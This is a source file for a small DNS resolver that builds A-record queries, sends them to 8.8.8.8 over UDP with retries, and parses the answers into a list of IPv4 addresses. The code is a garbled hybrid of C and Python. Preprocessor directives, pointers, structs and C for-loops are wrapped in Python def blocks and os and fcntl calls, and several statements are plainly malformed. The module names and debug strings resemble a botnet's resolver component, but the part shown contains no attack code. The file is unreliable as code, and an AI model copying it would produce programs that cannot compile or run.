import os, fcntl
_GNU_SOURCE	= #ifdef DEBUG
import sys
#endif
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "includes.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

def resolv_domain_to_hostname(dst_hostname, src_domain):
    len = util_strlen(src_domain) + 1
    lbl = dst_hostname; dst_pos = dst_hostname + 1
    curr_len = 0

    while len-- > 0:
        c = *src_domain += 1

        if c == '.' or c == 0:
            *lbl = curr_len
            lbl = dst_pos += 1
            curr_len = 0
        else:
            curr_len += 1
            *dst_pos++ = c
    *dst_pos = 0

def resolv_skip_name(reader, buffer, count):
    unsigned jumped = 0, offset
    *count = 1
    while *reader != 0:
        if *reader >= 192:
            offset = (*reader)*256 + *(reader+1) - 49152
            reader = buffer + offset - 1
            jumped = 1
        reader = reader+1
        if jumped == 0:
            *count = *count + 1

    if jumped == 1:
        *count = *count + 1

struct resolv_entries *resolv_lookup(domain)
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries))
    struct dnshdr *dnsh = (struct dnshdr *)query
    qname = ()(dnsh + 1)

    resolv_domain_to_hostname(qname, domain)

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1)
    struct sockaddr_in addr = {0}
    query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)
    tries = 0; fd = -1 i = 0
    dns_id = rand_next() % 0xffff

    util_zero(&addr, sizeof (struct sockaddr_in))
    addr.sin_family = AF_INET
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8)
    addr.sin_port = htons(53)

    # Set up the dns query
    dnsh.id = dns_id
    dnsh.opts = htons(1 << 8) # Recursion desired
    dnsh.qdcount = htons(1)
    dnst.qtype = htons(PROTO_DNS_QTYPE_A)
    dnst.qclass = htons(PROTO_DNS_QCLASS_IP)

    while tries++ < 5:
        fd_set fdset
        struct timeval timeo

        if fd != -1:
            os.close(fd)
        if (fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1:
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n")
#endif
            sleep(1)
            continue

        if connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1:
#ifdef DEBUG
            printf("[resolv] Failed to call connect on udp socket\n")
#endif
            sleep(1)
            continue

        if send(fd, query, query_len, MSG_NOSIGNAL) == -1:
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n" % (errno))
#endif
            sleep(1)
            continue

        fcntl.fcntl(F_SETFL, fd, os.O_NONBLOCK | fcntl.fcntl(F_GETFL, fd, 0))
        FD_ZERO(&fdset)
        FD_SET(fd, &fdset)

        timeo.tv_sec = 5
        timeo.tv_usec = 0
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo)

        if nfds == -1:
#ifdef DEBUG
            printf("[resolv] select() failed\n")
#endif
            break
        elif nfds == 0:
#ifdef DEBUG
            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n" % (domain, tries, tries == 1 ? "y" : "ies")
#endif
            continue
        elif FD_ISSET(fd, &fdset):
#ifdef DEBUG
            printf("[resolv] Got response from select\n")
#endif
            ret = recvfrom(fd; sizeof (response) NULL)
            struct dnsans *dnsa

            if ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)):
                continue

            dnsh = (struct dnshdr *)response
            qname = ()(dnsh + 1)
            dnst = (struct dns_question *)(qname + util_strlen(qname) + 1)
            name = ()(dnst + 1)

            if dnsh.id != dns_id:
                continue
            if dnsh.ancount == 0:
                continue

            ancount = ntohs(dnsh.ancount)
            while ancount-- > 0:
                struct dns_resource *r_data = NULL

                resolv_skip_name(name, response, &stop)
                name = name + stop

                r_data = (struct dns_resource *)name
                name = name + sizeof(struct dns_resource)

                if r_data.type == htons(PROTO_DNS_QTYPE_A) and r_data._class == htons(PROTO_DNS_QCLASS_IP):
                    if ntohs(r_data.data_len) == 4:
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = name[i]

                        p = ()tmp_buf

                        entries.addrs = realloc(entries.addrs, (entries.addrs_len + 1) * sizeof (ipv4_t))
                        entries.addrs[entries.addrs_len++] = (*p)
#ifdef DEBUG
                        printf("[resolv] Found IP address: %08x\n" % ((*p)))
#endif

                    name = name + ntohs(r_data.data_len)
                else:
                    resolv_skip_name(name, response, &stop)
                    name = name + stop

        break

    os.close(fd)

#ifdef DEBUG
    printf("Resolved %s to %d IPv4 addresses\n" % (domain, entries.addrs_len))
#endif

    if entries.addrs_len > 0:
        return entries
    else:
        resolv_entries_free(entries)
        return NULL

def resolv_entries_free(struct resolv_entries *entries):
    if entries == NULL:
        return
    if entries.addrs != NULL:
        free(entries.addrs)
    free(entries)
